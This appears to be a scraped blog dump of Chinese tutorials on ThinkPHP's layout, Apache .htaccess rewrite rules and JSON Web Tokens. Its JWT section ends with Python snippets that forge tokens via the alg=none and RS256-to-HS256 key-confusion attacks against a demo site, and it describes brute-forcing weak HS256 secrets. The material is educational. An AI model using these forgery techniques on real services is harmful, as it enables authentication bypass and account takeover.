└─logo.png 框架LOGO文件│├─extend 扩展类库目录├─runtime 应用的运行时目录（可写，可定制）├─vendor 第三方类库目录（Composer依赖库）├─build.php 自动生成定义文件（参考）├─composer.json composer 定义文件├─LICENSE.txt 授权说明文件├─README.md README 文件├─think 命令行入口文件 如果在linux环境下面的话，需要给 runtime 目录 777权限。 如果在linux环境下面的话，需要给 runtime 目录 777权限。 application：应用目录 index：模块目录 index/config.php:模块配置文件 index/common.php:模块公共函数文件 index/controller:控制器目录 index/model:模型目录 index/view:视图目录 config.php:应用配置文件 command.php:命令工具配置文件 common.php:应用公共函数文件 tags.php:应用行为扩展定义文件 extend：扩展类库目录 public：WEB 部署目录（对外访问目录） static:静态资源存放目录(css,js,image) index.php:应用入口文件 .htaccess:用于apache重写 router.php:快速测试文件 runtime：应用的运行时目录 vendor：通过composer安装的第三方类库目录 thinkphp：系统核心目录 lang:系统语言包目录 library:框架核心类库目录 tpl:系统模板目录 base.php:基础定义文件 route：路由配置目录 ThinkPHP框架最基本的架构 thinkphp是基于MVC模式开发的，业务逻辑、数据、界面显示分离，将业务逻辑聚集到一个部件里面，在改进和个性化定制界面及用户交互的同时，不需要重新编写业务逻辑。 1、入口文件 用户发起的请求都会经过应用的入口文件，通常是 public/index.php文件。入口文件的内容如下： 在入口文件index.php中加载了基础文件base.php文件,在base.php中干了这样一些事情： 载入Loader类 注册自动加载 注册错误和异常处理机制 实现日志接口 注册类库别名 加载完基础文件之后，最后在index.php中执行应用并响应。 2、应用 ThinkPHP的应用是一个管理系统架构及生命周期的对象，由系统创建完成，应用通常在入口文件中被调用和执行，每个应用都具有自己独立的模块、config配置文件以及common公共函数文件。 3、模块 一个应用是可能是由多个模块组成的，通俗的来说，这些模块即为该应用目录下面的一个个的子目录，每个模块都有自己独立的MVC结构、config配置文件以及common公共函数文件。 注：模块名称请避免使用PHP保留关键字，否则会造成系统错误。 4、控制器 控制器主要负责接收发送过来的请求，并调用相关的模型业务逻辑的数据处理，并最终将用户请求数据渲染到视图页面上。 5、模型 模型类通常完成实际的业务逻辑和数据封装，并返回和格式无关的数据。在定义模型时，要注意和表名对应，因为框架中的模型会自动对应数据库中的数据表。在ThinkPHP中模型类的命名规则是除去表前缀的数据表名称，命名方式采用的驼峰命名法，而且模型的首字母要大写。 6、视图 视图接收从控制器渲染过来的数据，将数据渲染的成用户可见的页面。 7、命名空间 命名空间是程序设计者命名的内存区域，程序设计者根据需指定一些有名字的空间域，把一些全局实体分别存放到各个命名空间中，从而与其他全局实体分隔开。 通俗的说，每个名字空间都是一个名字空间域，存放在名字空间域中的全局实体只在本空间域内有效。名字空间对全局实体加以域的限制，从而合理的解决命名冲突。"},{"title":"php-htaccess","date":"2020-03-16","updated":"2024-03-19","path":"2020/03/16/php-htaccess/","text":"简介 .htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。 概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。 .htaccess 详解 .htaccess是什么 启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。 笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。 工作原理 .htaccess文件(或者”分布式配置文件”)提供了针对每个目录改变配置的方法，即在一个特定的目录中放置一个包含指令的文件，其中的指令作用于此目录及其所有子目录。 说明： 如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置： AccessFileName .config 通常，.htaccess文件使用的配置语法和主配置文件一样。AllowOverride指令按类别决定了.htaccess文件中哪些指令才是有效的。如果一个指令允许在.htaccess中使用，那么在本手册的说明中，此指令会有一个覆盖项段，其中说明了为使此指令生效而必须在AllowOverride指令中设置的值。 (不)使用.htaccess文件的场合 一般情况下，不应该使用.htaccess文件，除非你对主配置文件没有访问权限。有一种很常见的误解，认为用户认证只能通过.htaccess文件实现，其实并不是这样，把用户认证写在主配置文件中是完全可行的，而且是一种很好的方法。 .htaccess文件应该被用在内容提供者需要针对特定目录改变服务器的配置而又没有root权限的情况下。如果服务器管理员不愿意频繁修改配置，则可以允许用户通过.htaccess文件自己修改配置，尤其是ISP在同一个机器上运行了多个用户站点，而又希望用户可以自己改变配置的情况下。 虽然如此，一般都应该尽可能地避免使用.htaccess文件。任何希望放在.htaccess文件中的配置，都可以放在主配置文件的&lt;Directory&gt;段中，而且更高效。 避免使用.htaccess文件有两个主要原因。 首先是性能。如果AllowOverride启用了.htaccess文件，则Apache需要在每个目录中查找.htaccess文件，因此，无论是否真正用到，启用.htaccess都会导致性能的下降。另外，对每一个请求，都需要读取一次.htaccess文件。 还有，Apache必须在所有上级的目录中查找.htaccess文件，以使所有有效的指令都起作用(参见指令的生效)，所以，如果请求/www/htdocs/example中的页面，Apache必须查找以下文件： /.htaccess /www/.htaccess /www/htdocs/.htaccess /www/htdocs/example/.htaccess 总共要访问4个额外的文件，即使这些文件都不存在。(注意，这可能仅仅由于允许根目录”/”使用.htaccess ，虽然这种情况并不多。) 其次是安全。这样会允许用户自己修改服务器的配置，这可能会导致某些意想不到的修改，所以请认真考虑是否应当给予用户这样的特权。但是，如果给予用户较少的特权而不能满足其需要，则会带来额外的技术支持请求，所以，必须明确地告诉用户已经给予他们的权限，说明AllowOverride设置的值，并引导他们参阅相应的说明，以免日后生出许多麻烦。 注意，在/www/htdocs/example目录下的.htaccess文件中放置指令，与在主配置文件中&lt;Directory /www/htdocs/example&gt;段中放置相同指令，是完全等效的。 /www/htdocs/example目录下的.htaccess文件的内容： AddType text/example .exm httpd.conf文件中摘录的内容： 123&lt;Directory /www/htdocs/example&gt;AddType text/example .exm&lt;/Directory&gt; 指令的作用范围 .htaccess文件中的配置指令作用于.htaccess文件所在的目录及其所有子目录，但是很重要的、需要注意的是，其上级目录也可能会有.htaccess文件，而指令是按查找顺序依次生效的，所以一个特定目录下的.htaccess文件中的指令可能会覆盖其上级目录中的.htaccess文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。 语法 12345678910RewriteEngine OnRewriteCond %&#123;HTTP_HOST&#125; ^(www\\.)?xxx\\.com$RewriteCond %&#123;REQUEST_URI&#125; !^/blog/RewriteCond %&#123;REQUEST_FILENAME&#125; !-fRewriteCond %&#123;REQUEST_FILENAME&#125; !-dRewriteRule ^(.*)$ /blog/$1# 没有输入文件名的默认到到首页RewriteCond %&#123;HTTP_HOST&#125; ^(www\\.)?xxx\\.com$RewriteRule ^(/)?$ blog/index.php [L] [RewriteEngine ](http://www.lvjiyong.com/tag/rewrite/)On 表示重写引擎开，关闭off，作用就是方便的开启或关闭以下的语句，这样就不需要一条一条的注释语句了。 RewriteCond %&#123;HTTP_HOST&#125; ^(www\\.)?xxx\\.com$ 这是重写条件，前面%&#123;HTTP_HOST&#125;表示当前访问的网址，只是指前缀部分，格式是www.xxx.com不包括“http://”和“/”，^表示 字符串开始，$表示字符串结尾，\\.表示转义的. ，如果不转义也行，推荐转义，防止有些服务器不支持，?表示前面括号www.出现0次或1次，这句规则的意思就是如果访问的网址是xxx.com或者 www.xxx.com就执行以下的语句，不符合就跳过。 RewriteCond %&#123;REQUEST_URI&#125; !^/blog/ 也是重写条件，%&#123;REQUEST_URI&#125;表示访问的相对地址，就是相对根目录的地址，就是域名/后面的成分，格式上包括最前面的“/”，!表示非，这句语句表示访问的地址不以/blog/开头，只是开头^，没有结尾$ RewriteCond %&#123;REQUEST_FILENAME&#125; !-f RewriteCond %&#123;REQUEST_FILENAME&#125; !-d 这两句语句的意思是请求的文件或路径是不存在的，如果文件或路径存在将返回已经存在的文件或路径 RewriteRule ^(.*)$ /blog/$1 重写规则，最重要的部分，意思是当上面的RewriteCond条件都满足的时候，将会执行此重写规则，^(.*)$是一个正则表达的 匹配，匹配的是当前请求的URL，^(.*)$意思是匹配当前URL任意字符，.表示任意单个字符，*表示匹配0次或N次（N&gt;0），后面 /blog/$1是重写成分，意思是将前面匹配的字符重写成/blog/$1，这个$1表示反向匹配，引用的是前面第一个圆括号的成分，即^(.*)$中 的.* ，其实这儿将会出现一个问题，后面讨论。 123RewriteCond %&#123;HTTP_HOST&#125; ^(www\\.)?xxx\\.com$[RewriteRule](http://www.lvjiyong.com/tag/rewriterule/) ^(/)?$ blog/index.[PHP](http://lib.csdn.net/base/php) [L] 这两句的意思是指请求的host地址是www.xxx.com是，如果地址的结尾只有0个或者1个“/”时，将会重写到子目录下的主页，我猜想这主要因为重写后的地址是不能自动寻找主页的，需要自己指定。 现在说说出现的问题，RewriteRule ^(.*)$ /blog/$1 前部分 ^(.*)$ 将会匹配当前请求的url。 例如：请求网址是http://www.xxx.com/a.html，到底是匹配整个http://www.xxx.com/a.html，还是只匹配`/a.html`即反斜杠后面的成分，还是只匹配`a.html`。 答案是：根据RewriteBase规则规定，如果rewritebase 为/，将会匹配a.html，不带前面的反斜杠，所以上条语句应该写成RewriteRule ^(.*)$ blog/$1（不带/），不过实际应用上带上前面的反斜杠，也可以用，可能带不带都行。现在问题出来了，如果不设置rewritebase 为/ ，将会匹配整个网址http://www.xxx.com/a.html，显然这是错误的，所以应该添加这条：`RewiteBase /` 还有一个问题是，不能保证每个人输入的网址都是小写的，如果输入大写的呢，Linux系统是区分大小写的，所以应该在RewriteCond后添加[NC]忽略大小写的。 RewriteCond 重写规则执行条件 语法: RewriteCond TestString CondPattern 生效域: server config, virtual host, directory, .htaccess 特别的上面的 TestString, 可提供反向引用. 引用模式为: %N 其中N为(0 &lt;= N &lt;=9), 引用当前若干RewriteCond条件中最后符合的条件中的分组成分, 也就是括号里的内容.不过用到的不多. 反向应用多在RewriteRule里常用. RewriteCond 语法中的 TestString 为要被检查的内容, CondPattern 是进行匹配的规则, 它是一个兼容Perl风格的正则表达式和一些其他的特有字符属性. 这里介绍一下. 第一个: ! (感叹号) 表示否的意思. 比如一个条件: 判断访问此页面的上一页URL是否包含 sex 字符的话可以用这样: RewriteCond %{HTTP_REFERER} !(sex) 第二个: &lt; 就是小于的意思, TestString &lt; CondPattern. 第三个: &gt; 就是大于于的意思, TestString &lt; CondPattern. 第四个: = 相等的意思. &lt;, &gt;, = 三个和通常程序语言使用的 &lt;, &gt;, = 功能类似. 第五个: -d 是否是一个目录. 判断TestString是否不是一个目录可以这样: !-d 第六个: -f 是否是一个文件. 判断TestString是否不是一个文件可以这样: !-f 第七个: -s 是否是一个正常的有大小的文件. 判断TestString是否不是一个正常的有大小的文件可以这样: !-s 第八个: -l 是否是一个快捷方式文件. 判断TestString是否不是一个快捷方式文件可以这样: !-l 第九个: -x 是否是一个文件并且又执行权限. 判断TestString是否不是一个文件并且又执行权限可以这样: !-x 第十个: -F 检查TestString是否是一个合法的文件，而且通过服务器范围内的当前设置的访问控制进行访问。这个检查是通过一个内部subrequest完成的, 因此需要小心使用这个功能以降低服务器的性能。 第十一个: -U 检查TestString是否是一个合法的URL，而且通过服务器范围内的当前设置的访问控制进行访问。这个检查是通过一个内部subrequest完成的, 因此需要小心使用这个功能以降低服务器的性能. 另外: RewriteCond 指令后面可带 Flag, 现在只要2个可用, 一个是 NC|nocase, 不区分大小写的意思. 一个是 OR|ornext 表示连接下一个条件的意思. RewriteCond 实际需要使用情况比如要判断一个条件成真的时候才执行相关的重写操作. 紧接着它下面的 RewriteRule 总是在RewriteCond 条件判断为真的时候才被执行. 看下面的一个例子: 12345678#开启服务器重写模式RewriteEngine on#来自 www.test.cn 的连接访问本站时都只能访问 test.php 这页.RewriteCond %&#123;HTTP_REFERER&#125; (www.test.cn)RewriteRule (.*)$ test.php#来自 www.test.com 的连接访问本站时都只能访问 newTest.php 这页.RewriteCond %&#123;HTTP_REFERER&#125; (www.test.com)RewriteRule (.*)$ newTest.php OK, RewriteCond 就介绍到这里了. 其实很简单. 就想程序里的 if() 这样的效果. RewriteRule语法： RewriteRule Pattern Substitution [flags] 【flags】 “chain|C”(链接下一规则) 此标记使当前规则与下一个规则相链接。它产生这样的效果：如果一个规则被匹配，则继续处理其后继规则，也就是这个标记不起作用；如果该规则不被匹配，则其后继规则将被跳过。比如，在一个目录级规则中执行一个外部重定向时，你可能需要删除”.www”(此处不应该出现”.www”)。 “cookie|CO=NAME:VAL:domain[:lifetime[:path]]”(设置cookie) 在客户端设置一个cookie。cookie的名称是NAME，值是VAL。domain是该cookie的域，比如&quot;.apache.org&quot;，可选的lifetime是cookie的有效期(分钟)，可选的path是cookie的路径。 “env|E=VAR:VAL”(设置环境变量) 此标记将环境变量VAR的值为VAL，VAL可以包含可扩展的正则表达式反向引用($N和%N)。此标记可以多次使用以设置多个变量。这些变量可以在其后许多情况下被间接引用，通常是在XSSI(&lt;!--#echo var=”VAR”--&gt;)或CGI($ENV&#123;&quot;VAR&quot;&#125;)中，也可以在后继的RewriteCond指令的CondPattern参数中通过%&#123;ENV:VAR&#125;引用。使用它可以记住从URL中剥离的信息。 “forbidden|F”(强制禁止URL) 强制禁止当前URL，也就是立即反馈一个HTTP响应码403(被禁止的)。使用这个标记，可以链接若干个RewriteConds来有条件地阻塞某些URL。 “gone|G”(强制废弃URL) 强制当前URL为已废弃，也就是立即反馈一个HTTP响应码410(已废弃的)。使用这个标记，可以标明页面已经被废弃而不存在了。 “handler|H=Content-handler”(强制指定内容处理器) 强自制定目标文件的内容处理器为Content-handler。例如，用来模拟mod_alias模块的ScriptAlias指令，以强制映射文件夹内的所有文件都由”cgi-script”处理器处理。 “last|L”(结尾规则) 立即停止重写操作，并不再应用其他重写规则。它对应于Perl中的last命令或C语言中的break命令。这个标记用于阻止当前已被重写的URL被后继规则再次重写。例如，使用它可以重写根路径的URL(&quot;/&quot;)为实际存在的URL(比如：&quot;/e/www/&quot;)。 “next|N”(从头再来) 重新执行重写操作(从第一个规则重新开始)。此时再次进行处理的URL已经不是原始的URL了，而是经最后一个重写规则处理过的URL。它对应于Perl中的next命令或C语言中的continue命令。此标记可以重新开始重写操作(立即回到循环的开头)。但是要小心，不要制造死循环！ “nocase|NC”(忽略大小写) 它使Pattern忽略大小写，也就是在Pattern与当前URL匹配时，&quot;A-Z&quot;和&quot;a-z&quot;没有区别。 “noescape|NE”(在输出中不对URI进行转义) 此标记阻止mod_rewrite对重写结果应用常规的URI转义规则。 一般情况下，特殊字符(&quot;%&quot;, &quot;$&quot;, &quot;;&quot;等)会被转义为等值的十六进制编码(&quot;%25′, &quot;%24′, &quot;%3B&quot;等)。此标记可以阻止这样的转义，以允许百分号等符号出现在输出中，比如： RewriteRule /foo/(.*) /bar?arg=P1\\%3d$1 [R,NE] 可以使&quot;/foo/zed转向到一个安全的请求&quot;/bar?arg=P1=zed&quot;。 “nosubreq|NS”(不对内部子请求进行处理) 在当前请求是一个内部子请求时，此标记强制重写引擎跳过该重写规则。比如，在mod_include试图搜索目录默认文件(index.xxx)时，Apache会在内部产生子请求。对于子请求，重写规则不一定有用，而且如果整个规则集都起作用，它甚至可能会引发错误。所以，可以用这个标记来排除某些规则。 使用原则：如果你为URL添加了CGI脚本前缀，以强制它们由CGI脚本处理，但对子请求处理的出错率(或者资源开销)很高，在这种情况下，可以使用这个标记。 “proxy|P”(强制为代理) 此标记使替换成分被内部地强制作为代理请求发送，并立即中断重写处理，然后把处理移交给mod_proxy模块。你必须确保此替换串是一个能够被mod_proxy处理的有效URI(比如以http://hostname开头)，否则将得到一个代理模块返回的错误。使用这个标记，可以把某些远程成分映射到本地服务器域名空间，从而增强了ProxyPass指令的功能。 注意：要使用这个功能，必须已经启用了mod_proxy模块。 “passthrough|PT”(移交给下一个处理器) 此标记强制重写引擎将内部request_rec结构中的uri字段设置为filename字段的值，这个小小的修改使得RewriteRule指令的输出能够被(从URI转换到文件名的)Alias, ScriptAlias, Redirect等指令进行后续处理 [原文：This flag is just a hack to enable post-processing of the output of RewriteRule directives, using Alias, ScriptAlias, Redirect, and other directives from various URI-to-filename translators.]。 举一个能说明其含义的例子： 如果要将/abc重写为/def， 然后再使用mod_alias将/def转换为/ghi，可以这样： 12RewriteRule ^/abc(.*) /def$1 [PT]Alias /def /ghi 如果省略了PT标记，虽然将uri=/abc/…重写为filename=/def/…的部分运作正常，但是后续的mod_alias在试图将URI转换到文件名时会遭遇失效。 如果省略了PT标记，虽然将uri=/abc/…重写为filename=/def/…的部分运作正常，但是后续的mod_alias在试图将URI转换到文件名时会遭遇失效。 注意：如果需要混合使用多个将URI转换到文件名的模块时，就必须使用这个标记。。此处混合使用mod_alias和mod_rewrite就是个典型的例子。 “qsappend|QSA”(追加查询字符串) 此标记强制重写引擎在已有的替换字符串中追加一个查询字符串，而不是简单的替换。如果需要通过重写规则在请求串中增加信息，就可以使用这个标记。 “redirect|R [=code]”(强制重定向) 若Substitution以http://thishost[:thisport]/(使新的URL成为一个URI)开头，可以强制性执行一个外部重定向。如果没有指定code，则产生一个HTTP响应码302(临时性移动)。如果需要使用在300-400范围内的其他响应代码，只需在此指定即可(或使用下列符号名称之一：temp(默认), permanent, seeother)。使用它可以把规范化的URL反馈给客户端，如将/~重写为/u/，或始终对/u/user加上斜杠，等等。 注意：在使用这个标记时，必须确保该替换字段是一个有效的URL。否则，它会指向一个无效的位置！并且要记住，此标记本身只是对URL加上http://thishost[:thisport]/前缀，重写操作仍然会继续进行。通常，你还会希望停止重写操作而立即重定向，那么就还需要使用L标记。 “skip|S=num”(跳过后继规则) 此标记强制重写引擎跳过当前匹配规则之后的num个规则。它可以模拟if-then-else结构：最后一个规则是then从句，而被跳过的skip=N个规则是else从句。注意：它和&quot;chain|C&quot;标记是不同的！ “type|T=MIME-type”(强制MIME类型) 强制目标文件的MIME类型为MIME-type，可以用来基于某些特定条件强制设置内容类型。比如，下面的指令可以让.php文件在以.phps扩展名调用的情况下由mod_php按照PHP源代码的MIME类型(application/x-httpd-php-source)显示： RewriteRule ^(.+\\.php)s$ $1 [T=application/x-httpd-php-source] 常见的.htaccess应用举例（部分例子引自四个例子实战讲解.htaccess文件rewrite规则） 4.1防止盗链，如果来得要访问jpe jpg bmp png结尾的url 用户不是来自我们的网站，那么让他看一张我们网站的展示图片。 1RewriteEngine OnRewriteCond %&#123;HTTP_REFERER&#125; !^http://(.+.)?mysite.com/ [NC]RewriteCond %&#123;HTTP_REFERER&#125; !^$RewriteRule .*.(jpe?g|gif|bmp|png)$ /images/nohotlink.jpg [L] 4.2 网站升级的时候，只有特定IP才能访问，其他的用户将看到一个升级页面 1RewriteEngine onRewriteCond %&#123;REQUEST_URI&#125; !/upgrade.html$RewriteCond %&#123;REMOTE_HOST&#125; !^24\\.121\\.202\\.30 RewriteRule $ http://www.nbphp.com/upgrade.html [R=302,L] 4.3把老的域名转向新域名 1# redirect from old domain to new domainRewriteEngine OnRewriteRule ^(.*)$http://www.yourdomain.com/$1[R=301,L] https://www.cnblogs.com/adforce/archive/2012/11/23/2784664.html"},{"title":"JSON-Web-Token","date":"2020-03-15","updated":"2024-03-19","path":"2020/03/15/JSON-Web-Token/","text":"1. JSON Web Token是什么 JSON Web Token (JWT)是一个开放标准(RFC 7519)，它定义了一种紧凑的、自包含的方式，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。 2. 什么时候你应该用JSON Web Tokens 下列场景中使用JSON Web Token是很有用的： Authorization (授权) : 这是使用JWT的最常见场景。一旦用户登录，后续每个请求都将包含JWT，允许用户访问该令牌允许的路由、服务和资源。单点登录是现在广泛使用的JWT的一个特性，因为它的开销很小，并且可以轻松地跨域使用。 Information Exchange (信息交换) : 对于安全的在各方之间传输信息而言，JSON Web Tokens无疑是一种很好的方式。因为JWTs可以被签名，例如，用公钥/私钥对，你可以确定发送人就是它们所说的那个人。另外，由于签名是使用头和有效负载计算的，您还可以验证内容没有被篡改。 3. JSON Web Token的结构是什么样的 JSON Web Token由三部分组成，它们之间用圆点(.)连接。这三部分分别是： Header Payload Signature 因此，一个典型的JWT看起来是这个样子的： xxxxx.yyyyy.zzzzz 接下来，具体看一下每一部分： Header header典型的由两部分组成：token的类型（“JWT”）和算法名称（比如：HMAC SHA256或者RSA等等）。 例如： 然后，用Base64对这个JSON编码就得到JWT的第一部分 Payload JWT的第二部分是payload，它包含声明（要求）。声明是关于实体(通常是用户)和其他数据的声明。声明有三种类型: registered, public 和 private。 Registered claims : 这里有一组预定义的声明，它们不是强制的，但是推荐。比如：iss (issuer), exp (expiration time), sub (subject), aud (audience)等。 Public claims : 可以随意定义。 Private claims : 用于在同意使用它们的各方之间共享信息，并且不是注册的或公开的声明。 下面是一个例子： 对payload进行Base64编码就得到JWT的第二部分 注意，不要在JWT的payload或header中放置敏感信息，除非它们是加密的。 Signature 为了得到签名部分，你必须有编码过的header、编码过的payload、一个秘钥，签名算法是header中指定的那个，然对它们签名即可。 例如： HMACSHA256(base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret) 签名是用于验证消息在传递过程中有没有被更改，并且，对于使用私钥签名的token，它还可以验证JWT的发送方是否为它所称的发送方。 看一张官网的图就明白了： 4. JSON Web Tokens是如何工作的 在认证的时候，当用户用他们的凭证成功登录以后，一个JSON Web Token将会被返回。此后，token就是用户凭证了，你必须非常小心以防止出现安全问题。一般而言，你保存令牌的时候不应该超过你所需要它的时间。 无论何时用户想要访问受保护的路由或者资源的时候，用户代理（通常是浏览器）都应该带上JWT，典型的，通常放在Authorization header中，用Bearer schema。 header应该看起来是这样的： Authorization: Bearer &lt;token&gt; 服务器上的受保护的路由将会检查Authorization header中的JWT是否有效，如果有效，则用户可以访问受保护的资源。如果JWT包含足够多的必需的数据，那么就可以减少对某些操作的数据库查询的需要，尽管可能并不总是如此。 如果token是在授权头（Authorization header）中发送的，那么跨源资源共享(CORS)将不会成为问题，因为它不使用cookie。 下面这张图显示了如何获取JWT以及使用它来访问APIs或者资源： 应用（或者客户端）想授权服务器请求授权。例如，如果用授权码流程的话，就是/oauth/authorize 当授权被许可以后，授权服务器返回一个access token给应用 应用使用access token访问受保护的资源（比如：API） 5. 基于Token的身份认证 与 基于服务器的身份认证 5.1. 基于服务器的身份认证 在讨论基于Token的身份认证是如何工作的以及它的好处之前，我们先来看一下以前我们是怎么做的： HTTP协议是无状态的，也就是说，如果我们已经认证了一个用户，那么他下一次请求的时候，服务器不知道我是谁，我们必须再次认证 传统的做法是将已经认证过的用户信息存储在服务器上，比如Session。用户下次请求的时候带着Session ID，然后服务器以此检查用户是否认证过。 这种基于服务器的身份认证方式存在一些问题： Sessions : 每次用户认证通过以后，服务器需要创建一条记录保存用户信息，通常是在内存中，随着认证通过的用户越来越多，服务器的在这里的开销就会越来越大。 Scalability : 由于Session是在内存中的，这就带来一些扩展性的问题。 CORS : 当我们想要扩展我们的应用，让我们的数据被多个移动设备使用时，我们必须考虑跨资源共享问题。当使用AJAX调用从另一个域名下获取资源时，我们可能会遇到禁止请求的问题。 CSRF : 用户很容易受到CSRF攻击。 5.2. JWT与Session的差异 相同点是，它们都是存储用户信息；然而，Session是在服务器端的，而JWT是在客户端的。 Session方式存储用户信息的最大问题在于要占用大量服务器内存，增加服务器的开销。 而JWT方式将用户状态分散到了客户端中，可以明显减轻服务端的内存压力。 Session的状态是存储在服务器端，客户端只有session id；而Token的状态是存储在客户端。 5.3. 基于Token的身份认证是如何工作的 基于Token的身份认证是无状态的，服务器或者Session中不会存储任何用户信息。 没有会话信息意味着应用程序可以根据需要扩展和添加更多的机器，而不必担心用户登录的位置。 虽然这一实现可能会有所不同，但其主要流程如下： 用户携带用户名和密码请求访问 服务器校验用户凭据 应用提供一个token给客户端 客户端存储token，并且在随后的每一次请求中都带着它 服务器校验token并返回数据 注意： 每一次请求都需要token Token应该放在请求header中 我们还需要将服务器设置为接受来自所有域的请求，用Access-Control-Allow-Origin: * 5.4. 用Token的好处 无状态和可扩展性：Tokens存储在客户端。完全无状态，可扩展。我们的负载均衡器可以将用户传递到任意服务器，因为在任何地方都没有状态或会话信息。 安全：Token不是Cookie。（The token, not a cookie.）每次请求的时候Token都会被发送。而且，由于没有Cookie被发送，还有助于防止CSRF攻击。即使在你的实现中将token存储到客户端的Cookie中，这个Cookie也只是一种存储机制，而非身份认证机制。没有基于会话的信息可以操作，因为我们没有会话! 还有一点，token在一段时间以后会过期，这个时候用户需要重新登录。这有助于我们保持安全。还有一个概念叫token撤销，它允许我们根据相同的授权许可使特定的token甚至一组token无效。 5.5. JWT与OAuth的区别 OAuth2是一种授权框架 ，JWT是一种认证协议 无论使用哪种方式切记用HTTPS来保证数据的安全性 OAuth2用在使用第三方账号登录的情况(比如使用weibo, qq, github登录某个app)，而JWT是用在前后端分离, 需要简单的对后台API进行保护时使用。 5.6. 关于OAuth可以参考下面几篇 《OAuth 2.0》 《Spring Security OAuth 2.0》 《OAuth 2.0 授权码请求》 6. 参考 https://jwt.io/ https://scotch.io/tutorials/the-ins-and-outs-of-token-based-authentication#toc-why-tokens-came-around https://tools.ietf.org/html/rfc7519#section-3 http://blog.leapoahead.com/2015/09/06/understanding-jwt/ https://cnodejs.org/topic/557844a8e3cc2f192486a8ff http://blog.leapoahead.com/2015/09/07/user-authentication-with-jwt/ https://www.cnblogs.com/cjsblog/p/9277677.html https://www.freebuf.com/column/207216.html 7. JWT安全问题 https://zhuanlan.zhihu.com/p/97017467 1.敏感信息泄露 很明显的一点，因为payload是明文传输的，所以如果payload中存在敏感信息就会出现信息泄露 2.修改算法为none 签名算法保证了JWT在传输的过程中不被恶意用户修改 但是header中的alg字段可被修改为none 一些JWT库支持none算法，即没有签名算法，当alg为none时后端不会进行签名校验 将alg修改为none后，去掉JWT中的signature数据（仅剩header + ‘.’ + payload + ‘.’）然后提交到服务端即可 这种攻击的例子可以参考：http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php 代码可以在Github上找到 https://github.com/Sjord/jwtdemo/ 这个例子的解法如下 12345678910111213141516import jwtimport base64# 原header# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9# &#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;# 原payload eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUwNDAwNjQzNSwiZXhwIjoxNTA0MDA2NTU1LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0# &#123;&quot;iss&quot;:&quot;http:\\/\\/demo.sjoerdlangkemper.nl\\/&quot;,&quot;iat&quot;:1504006435,&quot;exp&quot;:1504006555,&quot;data&quot;:&#123;&quot;hello&quot;:&quot;world&quot;&#125;&#125;def b64urlencode(data): return base64.b64encode(data).replace(&#x27;+&#x27;, &#x27;-&#x27;).replace(&#x27;/&#x27;, &#x27;_&#x27;).replace(&#x27;=&#x27;, &#x27;&#x27;)# 构造算法字段为none, payload部分可以随意修改print b64urlencode(&quot;&#123;\\&quot;typ\\&quot;:\\&quot;JWT\\&quot;,\\&quot;alg\\&quot;:\\&quot;none\\&quot;&#125;&quot;) + \\ &#x27;.&#x27; + b64urlencode(&quot;&#123;\\&quot;data\\&quot;:\\&quot;test\\&quot;&#125;&quot;) + &#x27;.&#x27; 结果如下 3.修改算法RS256为HS256（非对称密码算法 =&gt; 对称密码算法） HS256算法使用密钥为所有消息进行签名和验证。 而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。 如果将算法从RS256改为HS256，则后端代码将使用公钥作为密钥，然后使用HS256算法验证签名。 由于攻击者有时可以获取公钥，因此，攻击者可以将头部中的算法修改为HS256，然后使用RSA公钥对数据进行签名。 这样的话，后端代码使用RSA公钥+HS256算法进行签名验证。 同样地，我们也可以使用示例来了解这种攻击方法，具体请访问http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php RSA公钥：http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem。 相关的代码如下所示： 12345678import jwt# eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9# &#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;RS256&quot;&#125;# eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUwNDAwNzg3NCwiZXhwIjoxNTA0MDA3OTk0LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0# &#123;&quot;iss&quot;:&quot;http:\\/\\/demo.sjoerdlangkemper.nl\\/&quot;,&quot;iat&quot;:1504007874,&quot;exp&quot;:1504007994,&quot;data&quot;:&#123;&quot;hello&quot;:&quot;world&quot;&#125;&#125;public = open(&#x27;public.pem.1&#x27;, &#x27;r&#x27;).read()print publicprint jwt.encode(&#123;&quot;data&quot;:&quot;test&quot;&#125;, key=public, algorithm=&#x27;HS256&#x27;) 结果如下所示（验证通过）： 4.破解HS256（对称加密算法）密钥 如果HS256密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥，例如将密钥字符串用作PyJWT库示例代码中的密钥的时候情况就是如此。 然后，用蛮力方式对密钥进行猜解，具体方法很简单：如果密钥正确的话，解密就会成功；如果密钥错误的话，解密代码就会抛出异常。 此外，我们也可以使用PyJWT或John Ripper进行破解测试。 8. CTF中的JWT CISCN2019 华北赛区 